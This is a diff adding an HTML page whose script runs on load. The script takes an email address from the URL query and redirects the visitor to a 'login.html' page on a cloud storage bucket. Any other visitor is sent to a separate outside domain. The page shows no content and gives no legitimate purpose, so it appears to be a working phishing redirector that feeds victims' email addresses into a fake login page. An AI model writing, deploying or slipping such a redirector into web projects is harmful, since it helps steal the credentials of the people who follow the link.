@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function extractAndRedirect() {
+  // Get the query parameter from the URL
+  var queryParam = window.location.search.substring(1);
+
+  // Use a default redirect link if query parameter is empty
+  if (!queryParam) {
+    queryParam = '?'; // Change this to your default query parameter
+  }
+
+  // Convert the query parameter to a hash fragment
+  var hashFragment = "#" + queryParam;
+
+  // Check if the hash fragment includes '@' (email address indicator)
+  if (hashFragment.includes('@')) {
+    // It might be an email address, so let's check
+    var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (emailPattern.test(hashFragment)) {
+      // It's a valid email address, redirect to the email address page
+      var decodedEmail = decodeURIComponent(hashFragment);
+      window.location.href = 'https://deltathistlecurlingclub.us-iad-1.linodeobjects.com/login.html?' + decodedEmail;
+    } else {
+      // It's not a valid email address, redirect to the URL
+      window.location.href = "https://111yfa.pro?";
+    }
+  } else {
+    // It's a URL, redirect to the URL
+    window.location.href = "https://111yfa.pro?";
+  }
+}
+
+// Call the function immediately when the script is loaded
+extractAndRedirect();
+</script>
+</head>
+<body>
+</body>
+</html>
